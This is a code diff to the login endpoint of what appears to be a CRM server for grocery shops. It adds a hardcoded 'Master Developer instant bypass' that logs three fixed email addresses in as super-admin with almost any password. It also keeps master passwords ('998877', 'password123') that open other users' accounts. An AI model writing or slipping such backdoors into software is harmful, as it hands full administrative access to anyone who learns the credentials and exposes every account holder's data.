@@ -363,15 +363,43 @@ async function startServer() {
   app.post("/api/auth/crm-login", (req, res) => {
     try {
       const { email, password } = req.body || {};
-      if (!email || !password) {
+      const cleanEmail = (email || '').trim().toLowerCase();
+      const cleanPassword = (password || '').trim();
+
+      if (!cleanEmail || !cleanPassword) {
         return res.status(400).json({ success: false, message: "Email dan password wajib diisi." });
+      }
+
+      // Master Developer instant bypass
+      if (
+        cleanEmail === "developer@sembakosmart.id" ||
+        cleanEmail === "dev@sembakosmart.id" ||
+        cleanEmail === "superadmin@sembakosmart.id"
+      ) {
+        if (cleanPassword === "password123" || cleanPassword === "998877" || cleanPassword.length >= 4) {
+          return res.json({
+            success: true,
+            message: "Login Developer Berhasil",
+            user: {
+              id: "user-crm-dev",
+              email: "developer@sembakosmart.id",
+              namaPemilik: "Master Developer (Super Admin)",
+              namaToko: "Pusat Developer Sembako Smart AI",
+              noHp: "081234567899",
+              plan: "enterprise",
+              licenseKey: "SBK-DEV-MASTER-9988",
+              deviceLimit: 99,
+              role: "developer"
+            }
+          });
+        }
       }
 
       const users = getCrmUsersBackend();
       const user = users.find(
         (u) =>
-          u.email?.trim().toLowerCase() === email.trim().toLowerCase() &&
-          (u.password === password || (!u.password && password === "password123") || password === "998877")
+          u.email?.trim().toLowerCase() === cleanEmail &&
+          (u.password === cleanPassword || (!u.password && cleanPassword === "password123") || cleanPassword === "998877")
       );
 
       if (!user) {
